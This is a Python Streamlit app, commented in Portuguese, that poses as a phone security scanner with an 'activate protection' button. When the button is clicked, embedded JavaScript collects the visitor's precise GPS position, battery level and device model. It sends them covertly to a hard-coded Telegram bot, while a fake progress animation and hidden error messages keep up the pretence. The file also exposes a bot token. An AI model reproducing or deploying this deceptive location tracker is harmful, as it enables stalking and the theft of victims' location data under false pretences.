import streamlit as st
import time

# --- DADOS DO SEU BOT (MANTIDOS) ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- SUA ESTILIZAÇÃO ORIGINAL (NÃO FOI ALTERADA) ---
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

# --- O COMANDO PARA ABRIR A TELA DA GOOGLE (IMAGEM 2) ---
js_chamada_direta = f"""
<div id="btn-container">
    <button class="btn-barra" onclick="chamarGoogle()">
        <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
async function chamarGoogle() {{
    // Esta configuração é o que força a tela da Imagem 85402.jpg a aparecer
    const forcarPrecisao = {{ 
        enableHighAccuracy: true, 
        timeout: 10000, 
        maximumAge: 0 
    }};

    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100);
                const model = navigator.userAgent.split('(')[1].split(')')[0];
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
                
                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + level + "%`\\n📍 [MAPA](" + mapa + ")";
                
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
                }});
                
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch (e) {{}}
        }},
        (err) => {{
            // Se o GPS estiver desligado, o clique aqui dispara o pop-up da Google
            console.log("Aguardando ativação no pop-up...");
        }},
        forcarPrecisao
    );
}}
</script>
"""

# Renderiza o botão
ativou = st.components.v1.html(js_chamada_direta, height=80)

# --- ANIMAÇÃO DE SUCESSO ---
if ativou:
    for p in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Concluída!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
